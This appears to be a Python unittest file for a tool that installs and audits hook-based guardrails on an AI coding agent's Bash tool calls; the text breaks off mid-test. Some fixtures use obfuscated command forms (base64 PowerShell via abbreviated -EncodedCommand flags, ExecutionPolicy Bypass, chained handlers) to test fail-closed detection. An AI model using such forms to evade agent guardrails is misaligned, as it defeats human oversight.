from __future__ import annotations

import base64
import ctypes
import io
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
from contextlib import redirect_stdout
from datetime import datetime, timedelta, timezone
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

import harness


class HarnessTests(unittest.TestCase):
    def make_repo(self) -> Path:
        root = Path(self.temp.name) / "repo"
        root.mkdir()
        subprocess.run(["git", "init", "-q"], cwd=root, check=True)
        return root

    def make_linked_worktree(
        self, *, separate_git_dir: bool = False
    ) -> tuple[Path, Path]:
        root = (
            self.make_separate_git_dir_repo() if separate_git_dir else self.make_repo()
        )
        subprocess.run(
            ["git", "config", "user.email", "test@example.com"], cwd=root, check=True
        )
        subprocess.run(
            ["git", "config", "user.name", "Harness Test"], cwd=root, check=True
        )
        (root / "README.md").write_text("fixture\n", encoding="utf-8")
        subprocess.run(["git", "add", "README.md"], cwd=root, check=True)
        subprocess.run(["git", "commit", "-qm", "create fixture"], cwd=root, check=True)
        linked = Path(self.temp.name) / "linked"
        subprocess.run(
            ["git", "worktree", "add", "--detach", str(linked), "HEAD"],
            cwd=root,
            check=True,
        )
        return root, linked

    def make_separate_git_dir_repo(self) -> Path:
        root = Path(self.temp.name) / "separate-git-checkout"
        git_dir = Path(self.temp.name) / "separate-git-data"
        subprocess.run(
            ["git", "init", "-q", "--separate-git-dir", str(git_dir), str(root)],
            check=True,
        )
        return root

    def make_directory_alias(self, target: Path, alias: Path):
        try:
            alias.symlink_to(target, target_is_directory=True)
            return alias.unlink
        except OSError as exc:
            if sys.platform != "win32":
                self.skipTest(f"directory symlinks unavailable: {exc}")
            junction = subprocess.run(
                ["cmd", "/d", "/c", "mklink", "/J", str(alias), str(target)],
                capture_output=True,
                text=True,
                check=False,
            )
            if junction.returncode:
                self.skipTest(
                    "directory aliases unavailable: "
                    f"{exc}; {junction.stderr or junction.stdout}"
                )
            return alias.rmdir

    @staticmethod
    def write_hooks(checkout: Path, text: str) -> Path:
        hooks = checkout / ".codex" / "hooks.json"
        hooks.parent.mkdir(parents=True, exist_ok=True)
        hooks.write_text(text, encoding="utf-8")
        return hooks

    @staticmethod
    def requirements_hook_paths(existing_dir: Path) -> dict[str, str]:
        """Point this platform's managed hook field at a real directory.

        The other platform's field keeps a path that is absolute in its own
        flavour but not in this one, which is exactly the value the harness
        must accept without probing the filesystem.
        """
        if sys.platform == "win32":
            return {
                "managed_dir": "/managed/hooks",
                "windows_managed_dir": str(existing_dir),
            }
        return {
            "managed_dir": str(existing_dir),
            "windows_managed_dir": "C:/managed/hooks",
        }

    @staticmethod
    def inline_floor_config_text() -> str:
        pin = harness.normalized_text_sha256(
            Path(harness.__file__).resolve().parent
            / "templates"
            / "hooks"
            / "dispatch.py"
        )
        return (
            "[[hooks.PreToolUse]]\n"
            'matcher = "^Bash$"\n\n'
            "[[hooks.PreToolUse.hooks]]\n"
            'type = "command"\n'
            f'command = \'expected={pin}; python3 "$HOME/.claude/hooks/dispatch.py" '
            "--event pre --runtime codex'\n"
            f"commandWindows = \"$expected='{pin}'; py -3 "
            '$env:USERPROFILE/.claude/hooks/dispatch.py --event pre --runtime codex"\n'
            "timeout = 5\n"
        )

    @classmethod
    def write_inline_floor(cls, checkout: Path) -> Path:
        config = checkout / ".codex" / "config.toml"
        config.parent.mkdir(parents=True, exist_ok=True)
        config.write_text(cls.inline_floor_config_text(), encoding="utf-8")
        return config

    def make_sync_global_skill_fixture(
        self, name: str
    ) -> tuple[Path, Path, Path, SimpleNamespace]:
        root = Path(self.temp.name) / name
        config_root = root / "config"
        source_skill = config_root / "codex" / "skills" / "sample"
        target_skill = root / "skills-home" / "sample"
        source_skill.mkdir(parents=True)
        target_skill.mkdir(parents=True)
        (config_root / "codex" / "AGENTS.md").write_text("# laws\n", encoding="utf-8")
        for skill in (source_skill, target_skill):
            (skill / "SKILL.md").write_text("# sample\n", encoding="utf-8")
        skills_home = root / "skills-home"
        args = SimpleNamespace(
            config_root=str(config_root),
            codex_home=str(root / "codex-home"),
            claude_home=str(root / "claude-home"),
            skills_home=str(skills_home),
            apply=True,
        )
        return source_skill, target_skill, skills_home, args

    def assert_sync_global_rejects_alias_without_writes(
        self,
        args: SimpleNamespace,
        alias: Path,
        skills_home: Path,
    ) -> None:
        with self.assertRaisesRegex(harness.HarnessError, "unsafe skill tree alias"):
            harness.sync_global(args)
        self.assertTrue(harness.path_is_alias(alias))
        self.assertFalse(Path(args.codex_home).exists())
        self.assertFalse(Path(args.claude_home).exists())
        self.assertFalse((skills_home / ".harness-backups").exists())

    def run_doctor_with_fixture_globals(
        self,
        repo: Path,
        *,
        user_config: str | None = None,
        profile_configs: dict[str, str] | None = None,
        system_config: str | None = None,
        system_hooks: str | None = None,
        system_requirements: str | None = None,
        managed_config: str | None = None,
        offline: bool = False,
    ) -> tuple[int, str]:
        root = Path(self.temp.name)
        codex_home = root / "codex-home"
        claude_home = root / "claude-home"
        skills_home = root / "skills-home"
        (codex_home / "AGENTS.md").parent.mkdir()
        (codex_home / "AGENTS.md").write_text("# Codex\n", encoding="utf-8")
        if user_config is not None:
            (codex_home / "config.toml").write_text(user_config, encoding="utf-8")
        for filename, contents in (profile_configs or {}).items():
            (codex_home / filename).write_text(contents, encoding="utf-8")
        if system_config is not None:
            (root / "system-config.toml").write_text(system_config, encoding="utf-8")
        if system_hooks is not None:
            (root / "hooks.json").write_text(system_hooks, encoding="utf-8")
        if system_requirements is not None:
            (root / "requirements.toml").write_text(
                system_requirements, encoding="utf-8"
            )
        if managed_config is not None:
            (root / "managed-config.toml").write_text(managed_config, encoding="utf-8")
        harness_root = Path(harness.__file__).resolve().parent
        for filename in ("dispatch.py", "smoke_test.py"):
            target = claude_home / "hooks" / filename
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(
                (harness_root / "templates" / "hooks" / filename).read_bytes()
            )
        (skills_home / "sample").mkdir(parents=True)
        (skills_home / "sample" / "SKILL.md").write_text("# Skill\n", encoding="utf-8")
        args = SimpleNamespace(
            codex_home=str(codex_home),
            claude_home=str(claude_home),
            skills_home=str(skills_home),
            repo=str(repo),
            offline=offline,
        )
        original_run = harness.run

        def fixture_run(
            command: list[str], cwd: Path | None = None
        ) -> subprocess.CompletedProcess[str]:
            if command == [sys.executable, "--version"]:
                return subprocess.CompletedProcess(command, 0, "Python fixture", "")
            if command == ["git", "--version"]:
                return subprocess.CompletedProcess(command, 0, "git fixture", "")
            if command == ["codex", "--version"] or command[-1:] == ["codex --version"]:
                return subprocess.CompletedProcess(command, 0, "codex fixture", "")
            return original_run(command, cwd)

        output = io.StringIO()
        with mock.patch.object(harness, "run", side_effect=fixture_run):
            with mock.patch.object(
                harness,
                "codex_system_config_path",
                return_value=root / "system-config.toml",
            ):
                with mock.patch.object(
                    harness,
                    "codex_managed_config_path",
                    return_value=root / "managed-config.toml",
                ):
                    with redirect_stdout(output):
                        result = harness.doctor(args)
        return result, output.getvalue()

    def run_doctor_with_denied_static_source(
        self, repo: Path, denied_path: Path, **fixtures: str
    ) -> tuple[int, str]:
        original_is_file = Path.is_file
        original_read_text = Path.read_text

        def fixture_is_file(path: Path) -> bool:
            if path == denied_path:
                return False
            return original_is_file(path)

        def fixture_read_text(path: Path, *args: object, **kwargs: object) -> str:
            if path == denied_path:
                raise PermissionError("fixture denied")
            return original_read_text(path, *args, **kwargs)

        with mock.patch.object(
            Path, "is_file", autospec=True, side_effect=fixture_is_file
        ):
            with mock.patch.object(
                Path, "read_text", autospec=True, side_effect=fixture_read_text
            ):
                return self.run_doctor_with_fixture_globals(repo, **fixtures)

    def setUp(self) -> None:
        self.temp = tempfile.TemporaryDirectory()

    def tearDown(self) -> None:
        self.temp.cleanup()

    def test_seed_creates_runtime_neutral_tier(self) -> None:
        repo = self.make_repo()
        args = SimpleNamespace(
            path=str(repo),
            tier=2,
            push="free",
            merge="free",
            human_todo=None,
            sensitive_data=True,
            relaxed_work_loss_guards=False,
            dry_run=False,
        )
        self.assertEqual(harness.seed_repo(args), 0)
        data = json.loads(
            (repo / ".agent-harness" / "tier.json").read_text(encoding="utf-8")
        )
        self.assertEqual(data["name"], "daily-driver")
        self.assertTrue(data["flags"]["sensitive_data"])

    def test_seed_omits_unread_model_routing_block(self) -> None:
        repo = self.make_repo()
        args = SimpleNamespace(
            path=str(repo),
            tier=3,
            push="free",
            merge="gated",
            human_todo=None,
            sensitive_data=False,
            relaxed_work_loss_guards=False,
            dry_run=False,
        )
        self.assertEqual(harness.seed_repo(args), 0)
        data = json.loads(
            (repo / ".agent-harness" / "tier.json").read_text(encoding="utf-8")
        )
        self.assertNotIn("model_routing", data)

    def test_audit_ignores_legacy_model_routing_block(self) -> None:
        repo = self.make_repo()
        (repo / "AGENTS.md").write_text("# Agent guidance\n", encoding="utf-8")
        tier = {
            "tier": 2,
            "name": "daily-driver",
            "authority": {"push": "free", "merge": "free"},
            "flags": {"sensitive_data": False},
            "model_routing": {
                "harness_and_review": "sol",
                "slices": "terra",
                "maintenance": "luna",
            },
        }
        target = repo / ".agent-harness" / "tier.json"
        target.parent.mkdir()
        target.write_text(json.dumps(tier), encoding="utf-8")
        result = harness.audit_repo(repo)
        self.assertTrue(result["ok"], result["issues"])

    def test_seed_refuses_overwrite(self) -> None:
        repo = self.make_repo()
        target = repo / ".agent-harness" / "tier.json"
        target.parent.mkdir()
        target.write_text("{}", encoding="utf-8")
        args = SimpleNamespace(
            path=str(repo),
            tier=1,
            push="free",
            merge="free",
            human_todo=None,
            sensitive_data=False,
            relaxed_work_loss_guards=False,
            dry_run=False,
        )
        with self.assertRaises(harness.HarnessError):
            harness.seed_repo(args)

    def test_seed_refuses_legacy_tier_override(self) -> None:
        repo = self.make_repo()
        target = repo / ".claude" / "tier.json"
        target.parent.mkdir()
        target.write_text("{}", encoding="utf-8")
        args = SimpleNamespace(
            path=str(repo),
            tier=2,
            push="free",
            merge="free",
            human_todo=None,
            sensitive_data=False,
            relaxed_work_loss_guards=False,
            dry_run=False,
        )
        with self.assertRaises(harness.HarnessError):
            harness.seed_repo(args)

    def test_audit_accepts_minimal_t2_repo(self) -> None:
        repo = self.make_repo()
        (repo / "AGENTS.md").write_text("# Agent guidance\n", encoding="utf-8")
        tier = {
            "tier": 2,
            "name": "daily-driver",
            "authority": {"push": "free", "merge": "free"},
            "flags": {"sensitive_data": False},
        }
        target = repo / ".agent-harness" / "tier.json"
        target.parent.mkdir()
        target.write_text(json.dumps(tier), encoding="utf-8")
        result = harness.audit_repo(repo)
        self.assertTrue(result["ok"], result["issues"])

    def test_budgets_register_the_deny_floor_limitations_ledger(self) -> None:
        # FLOOR_LIMITATIONS.md declares a 120-line cap and a rotation target in
        # its own header, but budget_issues registered only CLAUDE.md /
        # AGENTS.md / AGENT_MAP.md / skills, so an overflowing ledger was
        # reported by nothing at all (issue #102).
        repo = Path(self.temp.name) / "budgets"
        repo.mkdir()
        ledger = repo / "FLOOR_LIMITATIONS.md"
        ledger.write_text("bypass family\n" * 120, encoding="utf-8")
        self.assertEqual(harness.budget_issues(repo, 3), [])
        ledger.write_text("bypass family\n" * 121, encoding="utf-8")
        self.assertEqual(
            harness.budget_issues(repo, 3),
            [
                "FLOOR_LIMITATIONS.md: 121>120 lines; "
                "ROTATE: rotate to archive/floor-limitations-<year>.md"
            ],
        )

    def test_audit_finds_stale_profile_path(self) -> None:
        repo = self.make_repo()
        (repo / "AGENTS.md").write_text(
            "See C:/Users/jekyt/source/repo\n", encoding="utf-8"
        )
        result = harness.audit_repo(repo)
        self.assertTrue(
            any("stale jekyt-profile" in issue for issue in result["issues"])
        )

    def test_remove_managed_floor_preserves_unrelated_hooks(self) -> None:
        dispatcher = Path(self.temp.name) / "codex" / "hooks" / "dispatch.py"
        managed_handler = harness.canonical_legacy_codex_floor_handler(dispatcher)
        current = json.dumps(
            {
                "hooks": {
                    "SessionStart": [
                        {"hooks": [{"type": "command", "command": "keep"}]}
                    ],
                    "PreToolUse": [
                        {
                            "hooks": [
                                managed_handler,
                                {
                                    "type": "command",
                                    "command": "python keep_unrelated.py",
                                },
                            ]
                        }
                    ],
                }
            }
        )
        result = json.loads(harness.remove_managed_codex_floor(current, dispatcher))
        self.assertEqual(
            result["hooks"]["SessionStart"][0]["hooks"][0]["command"], "keep"
        )
        self.assertEqual(
            result["hooks"]["PreToolUse"][0]["hooks"],
            [{"type": "command", "command": "python keep_unrelated.py"}],
        )

    def test_remove_managed_floor_deletes_empty_document(self) -> None:
        dispatcher = Path(self.temp.name) / "codex" / "hooks" / "dispatch.py"
        managed_handler = harness.canonical_legacy_codex_floor_handler(dispatcher)
        current = json.dumps({"hooks": {"PreToolUse": [{"hooks": [managed_handler]}]}})
        self.assertEqual(harness.remove_managed_codex_floor(current, dispatcher), "")

    def test_remove_managed_floor_refuses_nonfinite_rewrite(self) -> None:
        dispatcher = Path(self.temp.name) / "codex" / "hooks" / "dispatch.py"
        managed_handler = harness.canonical_legacy_codex_floor_handler(dispatcher)
        current = (
            '{"hooks":{"FutureEvent":1e400,"PreToolUse":[{"hooks":['
            f"{json.dumps(managed_handler)}"
            "]}]}}"
        )
        with self.assertRaises(harness.HarnessError):
            harness.remove_managed_codex_floor(current, dispatcher)

    def test_remove_managed_floor_normalizes_serializer_recursion(self) -> None:
        dispatcher = Path(self.temp.name) / "codex" / "hooks" / "dispatch.py"
        managed_handler = harness.canonical_legacy_codex_floor_handler(dispatcher)
        kept_handler = {"type": "command", "command": "echo keep"}
        current = json.dumps(
            {"hooks": {"PreToolUse": [{"hooks": [managed_handler, kept_handler]}]}}
        )
        # Baseline that keeps the assertion below non-vacuous: this exact input
        # rewrites cleanly, so the failure can only come from the serializer.
        rewritten = harness.remove_managed_codex_floor(current, dispatcher)
        self.assertEqual(
            json.loads(rewritten)["hooks"]["PreToolUse"], [{"hooks": [kept_handler]}]
        )

        serialized = []

        def failing_dumps(payload, **kwargs):
            serialized.append(payload)
            raise RecursionError("fixture depth")

        with mock.patch.object(harness.json, "dumps", side_effect=failing_dumps):
            with self.assertRaisesRegex(
                harness.HarnessError,
                r"refusing to rewrite hooks\.json with an ignored value",
            ):
                harness.remove_managed_codex_floor(current, dispatcher)
        # The rewrite reached serialization once, carrying the retained handler:
        # the HarnessError is the serializer boundary, not an earlier reject.
        self.assertEqual(len(serialized), 1)
        self.assertEqual(
            serialized[0]["hooks"]["PreToolUse"], [{"hooks": [kept_handler]}]
        )

    def test_deep_documents_never_leak_a_raw_recursion_error(self) -> None:
        # Whether the stdlib decoder or encoder survives a given depth is a
        # Python-version detail (3.11 fails in the decoder, 3.14.3 in the
        # encoder, 3.14.4 in neither). The contract is only that a RecursionError
        # is normalized instead of escaping as itself.
        dispatcher = Path(self.temp.name) / "codex" / "hooks" / "dispatch.py"
        managed_handler = harness.canonical_legacy_codex_floor_handler(dispatcher)
        ignored_depth = ('{"nested":' * 10000) + "0" + ("}" * 10000)
        current = (
            '{"hooks":{"FutureEvent":'
            + ignored_depth
            + ',"PreToolUse":[{"hooks":['
            + json.dumps(managed_handler)
            + "]}]}}"
        )
        try:
            rewritten = harness.remove_managed_codex_floor(current, dispatcher)
        except harness.HarnessError as error:
            # Normalized, and normalized at one of the two depth boundaries -
            # not swallowed by some unrelated rejection.
            self.assertRegex(
                str(error),
                r"invalid existing hooks\.json|"
                r"refusing to rewrite hooks\.json with an ignored value",
            )
        else:
            # A Python that survives the depth must still rewrite correctly:
            # the managed floor is gone and the ignored subtree is intact.
            self.assertNotIn("dispatch.py", rewritten)
            self.assertEqual(rewritten.count('"nested"'), 10000)

    def test_remove_managed_floor_retains_unowned_dispatcher(self) -> None:
        managed = Path(self.temp.name) / "codex" / "hooks" / "dispatch.py"
        current = json.dumps(
            {
                "hooks": {
                    "PreToolUse": [
                        {
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": "python D:/custom/dispatch.py --event pre --runtime codex",
                                }
                            ]
                        }
                    ]
                }
            }
        )
        self.assertEqual(len(harness.managed_codex_floor_groups(current)), 1)
        self.assertEqual(harness.remove_managed_codex_floor(current, managed), current)

    def test_remove_managed_floor_retains_partial_or_chained_handler(self) -> None:
        managed = Path(self.temp.name) / "codex" / "hooks" / "dispatch.py"
        canonical = harness.canonical_legacy_codex_floor_handler(managed)
        for handler in (
            {"type": "command", "command": canonical["command"]},
            {
                **canonical,
                "commandWindows": (
                    f"{canonical['commandWindows']}; Write-Output custom"
                ),
            },
            {
                **canonical,
                "command": (f"echo {managed} --event pre --runtime codex"),
            },
        ):
            with self.subTest(handler=handler):
                current = json.dumps({"hooks": {"PreToolUse": [{"hooks": [handler]}]}})
                self.assertEqual(
                    harness.remove_managed_codex_floor(current, managed), current
                )

    def test_global_floor_detection_is_fail_closed(self) -> None:
        encoded_script = "$d='D:/custom/dispatch.py'; & $d --event pre"
        encoded = base64.b64encode(encoded_script.encode("utf-16-le")).decode("ascii")
        for handler in (
            {
                "type": "command",
                "command": "python D:/custom/dispatch.py --event pre",
            },
            {
                "type": "command",
                "command": "powershell .codex/invoke_deny_floor.ps1",
            },
            {
                "type": "command",
                "command": "python D:/custom/dispatch.py --event=pre --runtime=codex",
            },
            {
                "type": "command",
                "command": "echo noop",
                "commandWindows": f"powershell -EncodedCommand {encoded}",
            },
        ):
            with self.subTest(handler=handler):
                current = json.dumps({"hooks": {"PreToolUse": [{"hooks": [handler]}]}})
                self.assertEqual(len(harness.managed_codex_floor_groups(current)), 1)

    def test_global_floor_detection_decodes_powershell_abbreviations(self) -> None:
        encoded_script = (
            "$d='$HOME/.claude/hooks/dispatch.py'; " "& $d --event pre --runtime codex"
        )
        encoded = base64.b64encode(encoded_script.encode("utf-16-le")).decode("ascii")
        for flag in ("-E", "-Ec", "-En", "-Enco", "-EncodedCommand"):
            with self.subTest(flag=flag):
                handler = {
                    "type": "command",
                    "command": "echo noop",
                    "commandWindows": f"powershell {flag} {encoded}",
                }
                current = json.dumps({"hooks": {"PreToolUse": [{"hooks": [handler]}]}})
                self.assertIn(
                    "dispatch.py",
                    harness.decode_windows_hook_command(handler["commandWindows"]),
                )
                self.assertEqual(len(harness.managed_codex_floor_groups(current)), 1)
                self.assertEqual(len(harness.repo_codex_floor_candidates(current)), 1)

        malformed = json.dumps(
            {
                "hooks": {
                    "PreToolUse": [
                        {
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": "echo noop",
                                    "commandWindows": "powershell -Ec not-base64",
                                }
                            ]
                        }
                    ]
                }
            }
        )
        self.assertEqual(len(harness.managed_codex_floor_groups(malformed)), 1)
        self.assertEqual(len(harness.repo_codex_floor_candidates(malformed)), 1)
        self.assertEqual(harness.repo_codex_floor_groups(malformed), [])
        for command in (
            f"powershell -EncodedCommand:{encoded}",
            f"powershell -NoProfile:true -EncodedCommand {encoded}",
            f"powershell -ExecutionPolicy:Bypass -EncodedCommand {encoded}",
            f"powershell -NoLogo: -EncodedCommand {encoded}",
            f"powershell -n -EncodedCommand {encoded}",
            f"powershell -i -EncodedCommand {encoded}",
        ):
            with self.subTest(command=command):
                self.assertNotIn(
                    "dispatch.py", harness.decode_windows_hook_command(command)
                )

    def test_windows_hook_command_alias_is_audited(self) -> None:
        alias_only_global = json.dumps(
            {
                "hooks": {
                    "PreToolUse": [
                        {
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": "echo noop",
                                    "command_windows": (
                                        'py -3 "$env:USERPROFILE/.claude/hooks/'
                                        'dispatch.py" --event pre --runtime codex'
                                    ),
                                }
                            ]
                        }
                    ]
                }
            }
        )
        self.assertEqual(len(harness.managed_codex_floor_groups(alias_only_global)), 1)
        self.assertEqual(len(harness.repo_codex_floor_candidates(alias_only_global)), 1)

        adapter_path = Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        adapter = json.loads(adapter_path.read_text(encoding="utf-8"))
        handler = adapter["hooks"]["PreToolUse"][0]["hooks"][0]
        handler["command_windows"] = handler.pop("commandWindows")
        alias_adapter = json.dumps(adapter)
        pin = harness.normalized_text_sha256(
            Path(harness.__file__).resolve().parent
            / "templates"
            / "hooks"
            / "dispatch.py"
        )
        self.assertEqual(len(harness.repo_codex_floor_groups(alias_adapter, pin)), 1)

    def test_hooks_helpers_reject_wrong_shapes(self) -> None:
        for current in ("[]", "null", '"text"', "1"):
            with self.subTest(current=current):
                with self.assertRaises(harness.HarnessError):
                    harness.managed_codex_floor_groups(current)
                with self.assertRaises(harness.HarnessError):
                    harness.repo_codex_floor_groups(current)
                with self.assertRaises(harness.HarnessError):
                    harness.remove_managed_codex_floor(current)
        with self.assertRaises(harness.HarnessError):
            harness.managed_codex_floor_groups(
                json.dumps({"hooks": {"PreToolUse": [{"hooks": None}]}})
            )
        wrong = (
            {"hooks": {"PreToolUse": [{"matcher": 7, "hooks": []}]}},
            {
                "hooks": {
                    "PreToolUse": [{"hooks": [{"type": 7, "command": "echo safe"}]}]
                }
            },
            {
                "hooks": {
                    "PreToolUse": [
                        {
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": "echo safe",
                                    "command_windows": 7,
                                }
                            ]
                        }
                    ]
                }
            },
            {
                "hooks": {
                    "PreToolUse": [
                        {
                            "hooks": [
                                {
                                    "type": "command",
                                    "command": "echo safe",
                                    "commandWindows": "echo one",
                                    "command_windows": "echo two",
                                }
                            ]
                        }
                    ]
                }
            },
        )
        for document in wrong:
            with self.subTest(document=document):
                with self.assertRaises(harness.HarnessError):
                    harness.repo_codex_floor_groups(json.dumps(document))
        self.assertEqual(
            harness.repo_codex_floor_groups(
                json.dumps({"hooks": {"PreToolUse": [{}]}})
            ),
            [],
        )

    def test_hooks_json_rejects_invalid_whole_document(self) -> None:
        invalid_documents = (
            "",
            '{"hooks": {}, "unknown": true}',
            '{"description": 7, "hooks": {}}',
            '{"hooks": {}, "hooks": {}}',
            '{"hooks": {"SessionStart": [], "SessionStart": []}}',
            (
                '{"hooks":{"PreToolUse":[{"hooks":[{"type":"command",'
                '"command":"echo one","command":"echo two"}]}]}}'
            ),
            '{"description": NaN, "hooks": {}}',
            '{"description": Infinity, "hooks": {}}',
            '{"description": -Infinity, "hooks": {}}',
            '{"description": 1e400, "hooks": {}}',
            '{"description": "\\ud800", "hooks": {}}',
            (
                '{"hooks":{"PreToolUse":[{"hooks":[{"type":"prompt",'
                '"ignored":"\\ud800"}]}]}}'
            ),
            (
                '{"hooks":{"PreToolUse":[{"hooks":[{"type":"agent",'
                '"ignored":1e400}]}]}}'
            ),
        )
        for current in invalid_documents:
            with self.subTest(current=current):
                with self.assertRaises(harness.HarnessError):
                    harness.parse_hooks_document(current)
        ignored_value = (
            '{"hooks":{"FutureEvent":{"duplicate":1,"duplicate":2,'
            '"value":"\\ud800","overflow":1e400},"PreToolUse":'
            '[{"hooks":[{"type":"prompt","ignored":1,"ignored":2}]}]}}'
        )
        harness.parse_hooks_document(ignored_value)
        nested: object = 0
        for _index in range(160):
            nested = [nested]
        deeply_nested = {"hooks": {"FutureEvent": nested}}
        harness.parse_hooks_document(json.dumps(deeply_nested))
        handler_content: object = 0
        for _index in range(harness.SERDE_JSON_HANDLER_CONTENT_MAX_CONTAINERS):
            handler_content = [handler_content]
        boundary_handler = {
            "hooks": {
                "PreToolUse": [
                    {"hooks": [{"type": "prompt", "ignored": handler_content}]}
                ]
            }
        }
        harness.parse_hooks_document(json.dumps(boundary_handler))
        boundary_handler["hooks"]["PreToolUse"][0]["hooks"][0]["ignored"] = [
            handler_content
        ]
        with self.assertRaises(harness.HarnessError):
            harness.parse_hooks_document(json.dumps(boundary_handler))
        huge_integer = "9" * 5000
        harness.parse_hooks_document(f'{{"hooks":{{"FutureEvent":{huge_integer}}}}}')

    def test_hooks_json_normalizes_decoder_recursion_failure(self) -> None:
        with mock.patch.object(
            harness.json,
            "loads",
            side_effect=RecursionError("fixture depth"),
        ):
            with self.assertRaisesRegex(
                harness.HarnessError,
                r"invalid existing hooks\.json: fixture depth",
            ):
                harness.parse_hooks_document('{"hooks":{}}')

    def test_hooks_schema_rejects_negative_zero_unsigned_fields(self) -> None:
        for field in ("timeout", "additionalContextLimit"):
            with self.subTest(field=field):
                document = (
                    '{"hooks":{"PreToolUse":[{"hooks":[{"type":"command",'
                    '"command":"echo safe","' + field + '":-0}]}]}}'
                )
                with self.assertRaises(harness.HarnessError):
                    harness.parse_hooks_document(document)

    def test_hooks_schema_validates_every_known_event(self) -> None:
        adapter_path = Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        adapter = json.loads(adapter_path.read_text(encoding="utf-8"))
        for event_name in harness.CODEX_HOOK_EVENT_NAMES:
            with self.subTest(event_name=event_name):
                document = json.loads(json.dumps(adapter))
                document["hooks"][event_name] = [
                    {"hooks": [{"type": "command", "command": 7}]}
                ]
                with self.assertRaises(harness.HarnessError):
                    harness.repo_codex_floor_groups(json.dumps(document))

    def test_hooks_schema_rejects_malformed_groups_and_handlers(self) -> None:
        invalid_groups = (
            7,
            [7],
            [{"matcher": 7}],
            [{"hooks": None}],
            [{"hooks": [7]}],
        )
        for groups in invalid_groups:
            with self.subTest(groups=groups):
                document = {"hooks": {"SessionStart": groups}}
                with self.assertRaises(harness.HarnessError):
                    harness.parse_hooks_document(json.dumps(document))

        invalid_handlers = (
            {},
            {"type": 7},
            {"type": "unknown"},
            {"type": "command"},
            {"type": "command", "command": 7},
            {"type": "command", "command": "ok", "commandWindows": 7},
            {
                "type": "command",
                "command": "ok",
                "commandWindows": "one",
                "command_windows": "two",
            },
            {"type": "command", "command": "ok", "timeout": 1.5},
            {"type": "command", "command": "ok", "timeout": True},
            {"type": "command", "command": "ok", "timeout": -1},
            {"type": "command", "command": "ok", "timeout": 1 << 64},
            {"type": "command", "command": "ok", "async": None},
            {"type": "command", "command": "ok", "async": 0},
            {"type": "command", "command": "ok", "async": "false"},
            {"type": "command", "command": "ok", "statusMessage": 7},
            {
                "type": "command",
                "command": "ok",
                "additionalContextLimit": True,
            },
            {
                "type": "command",
                "command": "ok",
                "additionalContextLimit": 1.5,
            },
            {
                "type": "command",
                "command": "ok",
                "additionalContextLimit": -1,
            },
            {
                "type": "command",
                "command": "ok",
                "additionalContextLimit": harness.USIZE_MAX + 1,
            },
        )
        for handler in invalid_handlers:
            with self.subTest(handler=handler):
                document = {"hooks": {"SessionStart": [{"hooks": [handler]}]}}
                with self.assertRaises(harness.HarnessError):
                    harness.parse_hooks_document(json.dumps(document))

    def test_hooks_schema_accepts_codex_defaults_and_nullable_fields(self) -> None:
        document = {
            "description": None,
            "hooks": {
                "FutureEvent": 7,
                "SessionStart": [
                    {},
                    {"matcher": None},
                    {
                        "matcher": "startup",
                        "hooks": [
                            {"type": "prompt", "ignored": 7},
                            {"type": "agent", "command": 7},
                            {
                                "type": "command",
                                "command": "echo ok",
                                "commandWindows": None,
                                "timeout": None,
                                "async": False,
                                "statusMessage": None,
                                "additionalContextLimit": None,
                                "ignored": 7,
                            },
                        ],
                    },
                ],
            },
        }
        current_data, hooks, groups = harness.parse_hooks_document(json.dumps(document))
        self.assertEqual(current_data, document)
        self.assertIs(hooks, current_data["hooks"])
        self.assertEqual(groups, [])
        self.assertEqual(harness.parse_hooks_document('{"description": "ok"}')[1], {})

    def test_non_command_handlers_never_count_as_floor_candidates(self) -> None:
        for handler in (
            {
                "type": "prompt",
                "command": (
                    "python $HOME/.claude/hooks/dispatch.py "
                    "--event pre --runtime codex"
                ),
            },
            {
                "type": "agent",
                "command": 7,
                "commandWindows": "one",
                "command_windows": "two",
            },
        ):
            with self.subTest(handler=handler):
                current = json.dumps({"hooks": {"PreToolUse": [{"hooks": [handler]}]}})
                self.assertEqual(harness.managed_codex_floor_groups(current), [])
                self.assertEqual(harness.repo_codex_floor_candidates(current), [])
                self.assertEqual(harness.repo_codex_floor_groups(current), [])
                self.assertFalse(harness.is_global_floor_handler(handler))
                self.assertFalse(harness.is_direct_codex_floor_handler(handler))

    def test_inline_hook_metadata_matches_each_codex_source_kind(self) -> None:
        valid_config = {
            "hooks": {
                "state": {
                    "one": {
                        "enabled": True,
                        "trusted_hash": "abc",
                        "ignored": 7,
                    }
                }
            }
        }
        harness.parse_hooks_document(json.dumps(valid_config), source_kind="config")
        managed_dir = Path(self.temp.name) / "managed-hooks"
        managed_dir.mkdir()
        valid_requirements = {
            "hooks": self.requirements_hook_paths(managed_dir),
        }
        harness.parse_hooks_document(
            json.dumps(valid_requirements), source_kind="requirements"
        )
        invalid_config_states = (
            {"hooks": {"state": 7}},
            {"hooks": {"state": {"one": 7}}},
            {"hooks": {"state": {"one": {"enabled": "yes"}}}},
            {"hooks": {"state": {"one": {"trusted_hash": 7}}}},
        )
        for malformed_state in invalid_config_states:
            with self.assertRaises(harness.HarnessError):
                harness.parse_hooks_document(
                    json.dumps(malformed_state), source_kind="config"
                )

        invalid_requirements = (
            {"hooks": {"managed_dir": 7}},
            {"hooks": {"windows_managed_dir": ["bad"]}},
        )
        for document in invalid_requirements:
            with self.subTest(document=document):
                with self.assertRaises(harness.HarnessError):
                    harness.parse_hooks_document(
                        json.dumps(document), source_kind="requirements"
                    )

    def test_requirements_hook_paths_reject_relative_managed_dirs(self) -> None:
        for field in ("managed_dir", "windows_managed_dir"):
            for value in ("relative", "hooks/managed", "./managed", ""):
                with self.subTest(field=field, value=value):
                    with self.assertRaisesRegex(
                        harness.HarnessError,
                        rf"requirements hooks\.{field} must be an absolute path",
                    ):
                        harness.parse_hooks_document(
                            json.dumps({"hooks": {field: value}}),
                            source_kind="requirements",
                        )

    def test_requirements_hook_paths_reject_missing_managed_dir(self) -> None:
        missing = Path(self.temp.name) / "managed-hooks-absent"
        document = {"hooks": self.requirements_hook_paths(missing)}
        field = "windows_managed_dir" if sys.platform == "win32" else "managed_dir"
        with self.assertRaisesRegex(
            harness.HarnessError,
